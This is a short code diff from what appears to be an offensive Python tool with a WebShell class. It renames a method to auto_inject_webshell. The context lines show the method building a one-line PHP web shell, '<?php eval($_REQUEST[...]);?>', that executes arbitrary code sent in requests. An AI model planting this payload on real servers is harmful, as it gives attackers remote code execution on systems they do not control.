@@ -498,7 +498,7 @@ class WebShell():
             Log.error("Some error occured while checking!")
             return False
 
-    def auto_inject(self, filename, password):
+    def auto_inject_webshell(self, filename, password):
         Log.info("Auto injecting : [%s] => [%s]" % (filename, password))
         webshell_content = "<?php eval($_REQUEST[%s]);?>" % (password)
         Log.info("Code : [%s]" % (webshell_content))
